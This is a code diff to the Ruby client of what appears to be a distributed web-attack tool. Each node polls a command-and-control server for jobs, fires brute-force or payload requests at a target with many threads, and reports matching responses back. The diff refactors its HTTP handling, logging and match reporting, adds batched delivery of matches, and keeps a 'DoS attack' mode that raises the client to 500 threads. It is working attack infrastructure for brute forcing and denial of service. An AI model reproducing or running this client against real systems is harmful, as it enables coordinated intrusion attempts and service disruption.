@@ -1,7 +1,13 @@
 	# encoding: utf-8
-	require './bruteforce.rb'
+	require './lib/cnc'
+	require './lib/helpers'
+	require 'net/http'
+	include Logging
 
 	SLEEP_TIME = 3
+
+	# Limit for match delivery queue
+	QUEUE_LIMIT = 100
 
 	class Client
 		def initialize(server, thread_count, proxy_host, proxy_port, api_key, cert_path)
@@ -34,6 +40,7 @@
 
 			@cert_path = cert_path
 
+			@delivery_queue = []
 		end
 
 		def invoke
@@ -43,7 +50,7 @@
 				cc_server_reachable = cc_stability_test
 			end
 
-			puts "(+) Polling for Job..."
+			logger.info "(+) Polling for Job..."
 			while @has_job == false
 				# Poll
 				job = request_job
@@ -69,6 +76,10 @@
 				@attack_payloads 	= parse_work(job["work"])
 			elsif @job_type == "bruteforce"
 				@charset = job["charset"]
+				charsets = get_charsets
+
+				initiateKeyspaceDict(charsets)
+
 				@attack_payloads = generateSubkeyspace(@charset, @bruteforce_index, 50)
 			end
 
@@ -76,30 +87,30 @@
 
 			# If the job type is repeat without response_flag_meta, set threads to 100
 			if @job_type == "repeat" && (@response_flag_meta.nil? || @response_flag_meta.count == 0)
-				puts "(+) DoS attack detected. Increasing thread count"
+				logger.info "(+) DoS attack detected. Increasing thread count"
 				@temp_thread_count = 500
 			end
 
-			puts "Work: #{@attack_payloads}"
+			logger.info "Work: #{@attack_payloads}"
 			kick_off_job!
 		end
 
+		# Everything is called via invoke
+		private
 		def request_job
 			endpoint = @server + "/poll/#{@node_id}"
 
 			headers = get_auth_headers
-			puts "Requesting Job"
+			logger.info "Requesting Job"
 
-			req = Mechanize.new.tap do |r|
-					if @server.match(/^https/)  # enable SSL/TLS
-					  r.agent.ca_file = @cert_path
-					end
-				end
+			req = CNC::Request.new(cnc_options)
 
 			begin
 				response = req.get(endpoint, {}, nil, headers)
 			rescue Exception => e
-				puts e.inspect
+				logger.error "Unable to connect to CNC"
+				logger.error "Endpoint: \t #{endpoint}"
+				logger.error "Stack trace: \t #{e.inspect}"
 			end
 
 			# Parse response
@@ -112,7 +123,7 @@
 				end
 			end
 			# Failed, but let's sleep
-			puts "Sleeping for #{SLEEP_TIME} seconds"
+			logger.info "Sleeping for #{SLEEP_TIME} seconds"
 			sleep(SLEEP_TIME)
 			return false
 		end
@@ -124,8 +135,8 @@
 				thread_count = @thread_count.to_i
 			end
 
-			puts "(+) Job recieved. Kicking it off with #{thread_count} threads"
-			puts "(+) Currently attacking: #{@http_uri}"
+			logger.info "(+) Job recieved. Kicking it off with #{thread_count} threads"
+			logger.info "(+) Currently attacking: #{@http_uri}"
 
 
 			monitor_thread_id = thread_count + 1
@@ -152,8 +163,8 @@
 
 			job_threads.each {|t| t.join }
 
-			puts "(+) Job has been stopped by C&C"
-			puts "(+) Beginning search for new job"
+			logger.info "(+) Job has been stopped by C&C"
+			logger.info "(+) Beginning search for new job"
 			invoke
 		end
 
@@ -207,6 +218,7 @@
 		# Currently this does not store any responses
 		#
 		def send_request(http_uri=nil,http_data=nil, http_headers=nil,payload=nil)
+=begin			
 			req = Mechanize.new.tap do |r|
 				if @proxy_host
 					r.set_proxy(@proxy_host, @proxy_port)
@@ -215,6 +227,8 @@
 				# Disabling verification.. we don't really care
 				r.verify_mode = OpenSSL::SSL::VERIFY_NONE
 			end
+=end
+
 
 			# Set these if they weren't passed in...
 			http_uri ||= @http_uri
@@ -222,44 +236,124 @@
 			http_headers ||= @http_headers
 
 			begin
+				uri = URI(http_uri)
+
 				if @http_method.downcase == "get"
-					response = req.get(http_uri, [], nil, http_headers)
+					req = Net::HTTP::Get.new(uri.path)
 				else
-					response = req.post(http_uri, http_data, http_headers)
+					req = Net::HTTP::Post.new(uri.path)
+					req.set_form_data(http_data)
 				end
 
-				req.shutdown
+				http_headers.each do |k,v|
+					req[k] = v
+				end
+
+				response = Net::HTTP.start(uri.hostname, uri.port) do |http|
+				  http.request(req)
+				end
 
 				# Let's ignore unless there are matches
 				unless @response_flag_meta.nil?
-					check_response_for_match(response.body, payload)
+					check_response_for_match(response, payload)
 				end
+
 				store_response(response) if @attack_mode == 'store'
 				@last_status_code = response.code.to_i
 			rescue Exception => e
-				puts "Unable to connect"
-				puts e.inspect
+				logger.error "Unable to connect to client"
+				logger.error e.inspect
 				@last_status_code = 0
 			end
 		end
 
+		# This is used to build the raw HTTP response from mechanize
+		def build_response_from_body_and_headers(headers, body) 
+			header_str = ""
+			headers.each do |header, val|
+				header_str += "#{header}: "
+
+				if val.length > 1 
+					header_str += "#{val.join(', ')}"
+				else
+						header_str += "#{val[0]}"
+				end
+				header_str += "\n"
+			end
+
+			return "#{header_str}\n#{body}"
+		end
+
 		def check_response_for_match(response, payload)
+			response_headers = response.to_hash
+			response_body = response.body
+
+			response = build_response_from_body_and_headers(response_headers, response_body)
+
 			@response_flag_meta.each do |metum|
 				match_value = metum["match_value"]
 				match_type = metum["match_type"]
+				match_delivery = metum["match_delivery"]
 
 				if match_type == "string"
 					if response.include?(match_value)
-						send_match_to_api(response, match_value, payload)
+						# Either send directly to API, or queue up
+						if metum["match_delivery"].nil? || metum["match_delivery"] == "instant"
+							send_match_to_api(response, match_value, payload)
+						else
+							# Queue
+							queue_match_for_bulk_delivery(response, match_value, payload)
+						end
 					end
 				else
 					pattern = Regexp.new(match_value)
+					matches = response.scan(pattern)
 
-					if response.match(pattern)
-						send_match_to_api(response, match_value, payload)
+					matches.each do |match|
+						if metum["match_delivery"].nil? || metum["match_delivery"] == "instant"
+							send_match_to_api(response, match, payload, match_value)
+						else
+							# Queue
+							queue_match_for_bulk_delivery(nil, match, payload, match_value)
+						end
 					end
 				end
 			end
+		end
+
+		def queue_match_for_bulk_delivery(response, match, payload=nil, match_value=nil)
+			@delivery_queue.push({ 
+				:response => response, 
+				:match => match, 
+				:payload => payload, 
+				:match_value => match_value,
+				:match_time	=> DateTime.now
+			})
+
+			# Send all results, once queue is over the limit
+			if @delivery_queue.count >= QUEUE_LIMIT
+				# Duplicate it, clean it, and operate on dup
+				queue = @delivery_queue.dup
+				@delivery_queue = []
+				logger.info "Sending bulk matches to server"
+
+				endpoint = "#{@server}/job/#{@job_id}/saveMatchBatch"
+
+				headers = get_auth_headers
+
+				data = { "matches": queue.to_json }
+
+				logger.info "Sending match to server"
+				begin
+					req = CNC::Request.new(cnc_options)
+					response = req.post(endpoint, data, headers)
+				rescue
+					logger.error "Failed sending bulk matches to api"
+					logger.error endpoint
+					logger.error data
+				end
+			end
+
 		end
 
 		def store_response(response)
@@ -272,38 +366,35 @@
 				:nodeid 					=> @node_id	
 			}
 			begin
-				req = Mechanize.new.tap do |r|
-					if @server.match(/^https/)  # enable SSL/TLS
-					  r.agent.ca_file = @cert_path
-					end
-				end
+				req = CNC::Request.new(cnc_options)
 				response = req.post(endpoint, data, headers)
 			rescue
-				puts "Failed sending response to api"
+				logger.error "Failed sending response to api"
+				logger.error endpoint
+				logger.error data
 			end
 		end
 
-		def send_match_to_api(response, match_value, payload=nil) 
+		def send_match_to_api(response, match, payload=nil, match_value=nil) 
 			endpoint = "#{@server}/job/#{@job_id}/saveMatch"
 
 			headers = get_auth_headers
+			response_string = @attack_mode == 'store' ? response.body : "";
 			data = { 
-				:response 				=> Base64.encode64(response),
-				:match_value			=> match_value,
+				:response 				=> Base64.encode64(response_string),
+				:match_value			=> match,
 				:payload 					=> payload,
 				:nodeid 					=> @node_id	
 			}
 
-			puts "Sending match to server"
+			logger.info "Sending match to server"
 			begin
-				req = Mechanize.new.tap do |r|
-					if @server.match(/^https/)  # enable SSL/TLS
-					  r.agent.ca_file = @cert_path
-					end
-				end
+				req = CNC::Request.new(cnc_options)
 				response = req.post(endpoint, data, headers)
 			rescue
-				puts "Failed sending match to api"
+				logger.error "Failed sending match to api"
+				logger.error endpoint
+				logger.error data
 			end
 		end
 
@@ -316,18 +407,14 @@
 			# check status code
 			status_code = @last_status_code
 
-			puts "Checking job status for job #{@job_id} on node #{@node_id}"
+			logger.info "Checking job status for job #{@job_id} on node #{@node_id}"
 
 			# Todo: Refactor this to also send the most previous http status code
 			endpoint = "#{@server}/checkin/#{@node_id}/#{@job_id}/#{status_code}"
 			headers = get_auth_headers
 
 			begin
-				req = Mechanize.new.tap do |r|
-					if endpoint.match(/^https/)  # enable SSL/TLS
-					  r.agent.ca_file = @cert_path
-					end
-				end
+				req = CNC::Request.new(cnc_options)
 
 				response = req.get(endpoint, [], nil, headers)
 
@@ -347,8 +434,8 @@
 					return false
 				end
 			rescue Exception => e
-				puts "unable to check status"
-				puts e.inspect
+				logger.error "unable to check status"
+				logger.error e.inspect
 				# Ehh, let it slide for now.
 				# Eventually there should be an error counter that kills
 				# jobs based on a certain number of unsuccessful attempts
@@ -356,30 +443,43 @@
 		end
 
 		def cc_stability_test
-			req = Mechanize.new.tap do |r|
-				if @proxy_host
-					r.set_proxy(@proxy_host, @proxy_port)
-				end
-
-				if @server.match(/^https/)  # enable SSL/TLS
-				  r.agent.ca_file = @cert_path
-				end
-			end
+			req = CNC::Request.new(cnc_options)
 
 			begin
 				response = req.head(@server + "/health")
 				if response.code.to_i >= 400
-					puts "(!) Unable to communicate with command and control server"
-					puts "(!) Please confirm address: #{@server}"
-					puts "(!) Code: #{response.code.to_s}"
+					logger.error "(!) Unable to communicate with command and control server"
+					logger.error "(!) Please confirm address: #{@server}"
+					logger.error "(!) Code: #{response.code.to_s}"
 					return false
 				else
 					return true
 				end
 			rescue Exception => e
-				puts "#{e.inspect}"
-				puts "(!) Unable to communicate with command and control server"
-				puts "(!) Please confirm address: #{@server}"
+				logger.error "#{e.inspect}"
+				logger.error "(!) Unable to communicate with command and control server"
+				logger.error "(!) Please confirm address: #{@server}"
+				return false
+			end
+		end
+
+		def get_charsets
+			# this is a mock for now
+			req = CNC::Request.new(cnc_options)
+
+			begin
+				response = req.get(@server + "/charsets")
+				charsets = JSON.parse(response.body)
+
+				charsets_hash = { }
+				charsets.each do |charset|
+					charsets_hash[charset["key"]] = charset["val"]
+				end
+
+				return charsets_hash
+			rescue Exception => e
+				logger.error "#{e.inspect}"
+				logger.error "(!) Unable to retrive charaset"
 				return false
 			end
 		end
@@ -389,60 +489,13 @@
 			headers = { "X-Node-Token" => @node_api_key}
 		end
 
-		def parse_work(work)
-			return [] if work.nil?
-
-			return URI.unescape(work).split("\n")
-		end
-
-		# Split data by & and =, returning hash
-		def parse_data(data)
-			# Don't split data if it's xml or json
-			
-			if data.match(/(\A<\?)|({)/)
-				return data
-			end
-
-			begin
-				URI.decode_www_form(data)
-			rescue
-				return {}
-			end
-		end
-
-		def parse_headers(headers)
-			header_hash = {}
-
-			lines = headers.split("\n")
-
-			lines.each do |line|
-				split_line = line.split(":", 2)
-
-				# Skip this line if it isn't splittable
-				next if split_line.count < 2
-
-				# Remove trailing whitespace
-				split_line[1].chomp!
-				
-				h = Hash[*split_line]
-				header_hash.merge!(h)
-			end
-
-			return header_hash
-		end
-
-		def mac_address
-		  platform = RUBY_PLATFORM.downcase
-		  output = `#{(platform =~ /win32/) ? 'ipconfig /all' : 'ifconfig'}`
-		  case platform
-		    when /darwin/
-		      $1 if output =~ /en1.*?(([A-F0-9]{2}:){5}[A-F0-9]{2})/im
-		    when /win32/
-		      $1 if output =~ /Physical Address.*?(([A-F0-9]{2}-){5}[A-F0-9]{2})/im
-		    # Cases for other platforms...
-		    when /linux/
-					$1 if output =~ /HWaddr.*?(([A-F0-9]{2}:){5}[A-F0-9]{2})/im
-		    else nil
-		  end
+		def cnc_options
+			{
+				:server 				=> @server,
+				:proxy_host			=> @proxy_host,
+				:proxy_port 		=> @proxy_port,
+				:cert_path			=> @cert_path,
+				:api_key 				=> @node_api_key
+			}
 		end
 	end
